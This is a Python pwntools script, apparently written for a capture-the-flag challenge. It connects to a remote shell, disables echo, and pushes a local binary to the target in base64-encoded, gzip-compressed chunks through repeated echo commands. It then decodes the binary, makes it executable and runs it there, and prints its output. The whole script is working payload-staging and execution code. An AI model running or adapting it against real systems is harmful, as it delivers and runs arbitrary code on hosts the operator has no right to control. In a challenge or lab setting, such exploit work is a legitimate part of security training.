#!/usr/bin/env python3

import base64
import gzip
import pwn
import sys

target = sys.argv[1]
port = int(sys.argv[2])

# Compress and encode the payload
with open("./a.out", "rb") as fp:
    compressed = gzip.compress(fp.read())
    payload = base64.b64encode(compressed).decode()

# Connect to the challenge
p = pwn.remote(target, port)
p.info("Waiting for shell...")
p.recvuntil(b"~ $")
p.sendline(b"stty -echo")
p.recvuntil(b"~ $")

# Send the payload in chunks
n = 1
chunk_size = 2048
r = range(0, len(payload), chunk_size)
for i in r:
    p.info(f"Sending command {n}/{len(r)}")
    chunk = payload[i : i + chunk_size]
    cmd = f"echo -n {chunk} >> b.txt"
    p.sendline(cmd.encode())
    p.recvuntil(b"~ $")
    n += 1

# Decode, decompress, and execute payload
p.info("Running payload...")
p.sendline(b"base64 -d b.txt | gzip -cd > a.out && chmod +x a.out && ./a.out")

p.recvuntil(b"Opening /proc/netdev")
print(p.recvuntil(b"~ $").decode())
